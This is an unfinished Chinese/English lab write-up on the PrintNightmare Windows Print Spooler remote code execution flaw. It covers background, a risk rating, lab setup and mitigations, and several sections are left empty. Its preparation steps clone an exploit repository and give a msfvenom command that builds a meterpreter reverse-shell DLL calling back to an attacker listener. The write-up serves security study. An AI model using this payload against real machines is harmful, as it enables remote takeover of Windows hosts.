# CVE-2021-34527 Playing with PrintNightmare 远程代码执行漏洞

[TOC]

# 1. 概述

## 1.1 Windows Print Spooler

Windows Print Spooler是Windows的打印机后台处理程序，广泛的应用于各种内网中。

Print Spooler是打印后台处理服务，即管理所有本地和网络打印队列及控制所有打印工作。如果此服务被停用，本地计算机上的打印将不可用。如果此服务被禁用，任何依赖于它的服务将无法启用。

Spooler（打印后台处理服务）的进程名是spoolsv.exe，WinXP Home/PRO默认安装的启动类型是自动，依赖于Remote Procedure Call。Spooler是为了提高文件打印效率，将多个请求打印的文档统一进行保存和管理，先将要打印的文件拷贝到内存，待打印机空闲后，再将数据送往打印机处理。这样处理速度更快些。建议将其设置为手动，有打印任务时再打开。如果没有打印机自然是禁用了。

可执行文件路径: C:\WINDOWS\system32\spoolsv.exe

You are able to Start/Stop/Pause/Resume the Print Spooler Service by simply navigating to Services on your Windows system. 

![spooler](./img/spooler.png)

Print Spooler Properties (Services):

![print](./img/print.png)

## 1.2 漏洞简述

 



## 1.3 风险等级

|  评定方式   | 等级  |
|  ----  | ----  |
| CVSS Score | 9.0 |
| Confidentiality Impact  | Complete |
| Integrity Impact  | Complete |
| Availability Impact  | Complete |
| 实现难度  | 低 |
| 基础权限  | 不需要 |
| 漏洞类型  | Execute Code |

![cvss](./img/cvss.png)

## 1.4 影响范围

![Afet](./img/Afet.png)

## 1.5 漏洞详情

1. CVE-2021-1675与CVE-2021-34527虽然都叫Windows Print Spooler Remote Code Execution Vulnerability，而且两者都与Print Spooler有关，但是the PrintNightmare (CVE-2021-34527) vulnerability is similar but distinct from the vulnerability that is assigned CVE-2021-1675. The attack vector is different as well.

2. To exploit the **CVE-2021-1675** vulnerability, the attacker would need to have direct or local access to the machine to use a malicious DLL file to escalate privileges. To exploit the **CVE-2021-34527** vulnerability successfully, the attacker can remotely inject the malicious DLL file.

# 2. 环境配置

## 2.1 方案一: Tryhackme线上虚拟环境

![thm](./img/thm.png)

## 2.2 方案二

## 2.3 访问测试


# 3. 漏洞复现


## 3.1 准备工作

### 准备Payload&安装所需工具

1. 下载 [exploit](https://github.com/tryhackme/CVE-2021-1675)&[impacket](https://github.com/tryhackme/impacket)
    
    如果之前装过impacket为了实验顺利进行请先pip卸载，同时确保pyasn1 (version > 0.4.2)

    创建在两个文件夹
    1. pn-放exp和impacket
    2. share-此文件夹(/root/Desktop/share) 用来放由msfvenom创建的 malicious DLL

    Download CVE-2021-1675.py:  
    ```git clone https://github.com/tryhackme/CVE-2021-1675.git```

    Download & install Impacket: 
    ```git clone https://github.com/tryhackme/impacket.git```

    ![download](./img/download.png)

2. 安装
   
   进入Desktop/pn/impacket目录安装impacket
   ```python setup.py install```

3. 使用msfvenom创建malicious DLL
   
    ```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll ```

    ![DLL](./img/dll.png)

4. 

## 3.2 漏洞利用



# 4. 修复建议

1. 禁用Windows Print Spooler服务
2. 使用组策略禁用入站远程打印
3. 下载安装[微软官方补丁](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)

# 5. 总结



# 6. References

CVE Details (2020) _CVE-2021-34527_. Available at: https://www.cvedetails.com/cve/CVE-2021-34527/...(Accessed: 22 Oct 2022).


https://github.com/cube0x0/CVE-2021-1675

https://github.com/afwu/PrintNightmare
